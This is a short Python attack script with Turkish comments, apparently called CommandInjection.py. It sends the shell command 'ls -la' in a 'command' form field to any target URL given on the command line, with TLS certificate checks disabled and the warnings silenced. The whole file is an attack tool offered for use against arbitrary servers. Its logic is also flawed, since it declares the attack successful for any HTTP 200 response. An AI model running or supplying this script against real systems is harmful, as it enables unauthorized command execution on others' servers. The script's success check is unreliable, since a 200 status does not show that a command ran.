import requests
import certifi
import sys
import urllib3

# InsecureRequestWarning uyarısını bastırmak için
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def command_injection(url, command):
    # URL'i ve komutu birleştirin
    request_data = {"command": command}
    
    # URL'e HTTP isteği gönderin (sertifika doğrulamasını devre dışı bırak)
    response = requests.post(url, data=request_data, verify=False)
    
    # Cevabı kontrol edin
    if response.status_code == 200:
        # Saldırı başarılı
        return "Saldırı başarılı"
    else:
        # Saldırı başarısız
        return "Saldırı başarısız"

# Örnek kullanımı
if len(sys.argv) != 2:
    print("Usage: python3 CommandInjection.py <target_url>")
    sys.exit(1)

url = sys.argv[1]
command = "ls -la"

# Saldırı yapın
result = command_injection(url, command)

# Sonucu yazdırın
print(result)

